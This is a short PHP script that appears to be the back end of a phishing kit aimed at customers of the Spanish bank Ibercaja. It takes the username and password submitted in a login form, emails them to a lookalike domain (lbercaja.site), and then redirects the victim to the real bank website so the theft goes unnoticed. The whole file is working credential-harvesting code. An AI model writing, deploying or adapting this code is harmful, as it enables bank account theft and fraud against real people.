<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    // Envío del correo electrónico
    $to = "lbercaja@lbercaja.site";
    $subject = "Datos de inicio de sesión";
    $message = "Usuario: $username\nContraseña: $password";
    mail($to, $subject, $message);
    header("Location: https://www.ibercaja.es/");
    exit();
}
?>
